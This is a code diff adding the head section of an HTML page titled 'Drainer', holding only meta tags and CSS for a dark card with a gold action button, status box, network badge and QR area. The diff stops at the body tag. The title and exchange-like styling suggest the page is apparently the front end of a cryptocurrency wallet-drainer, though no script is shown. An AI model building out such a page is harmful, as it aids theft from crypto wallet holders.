@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Drainer</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background: #0b0e11;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background: #1e2329;
+      padding: 30px 24px;
+      border-radius: 24px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.7);
+    }
+    h1 { font-size: 24px; margin-bottom: 8px; }
+    .sub { font-size: 14px; color: #8e9aa8; margin-bottom: 24px; }
+    button {
+      background: #f0b90b;
+      color: #0b0e11;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 40px;
+      font-size: 18px;
+      font-weight: 700;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+      margin-top: 10px;
+    }
+    button:hover { background: #d9a80a; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #b7c0cb;
+      word-break: break-all;
+      background: #13171c;
+      padding: 12px;
+      border-radius: 12px;
+      min-height: 50px;
+      border: 1px solid #2b3139;
+      line-height: 1.5;
+    }
+    .status.success { color: #7cffb2; border-color: #7cffb2; }
+    .status.error { color: #ff6b6b; border-color: #ff6b6b; }
+    .footnote { margin-top: 18px; font-size: 12px; color: #5e6a78; }
+    .network-badge {
+      display: inline-block;
+      background: #2b3139;
+      padding: 4px 12px;
+      border-radius: 40px;
+      font-size: 12px;
+      color: #b7c0cb;
+      margin-bottom: 14px;
+    }
+    #qr-container {
+      margin: 16px auto;
+      display: flex;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
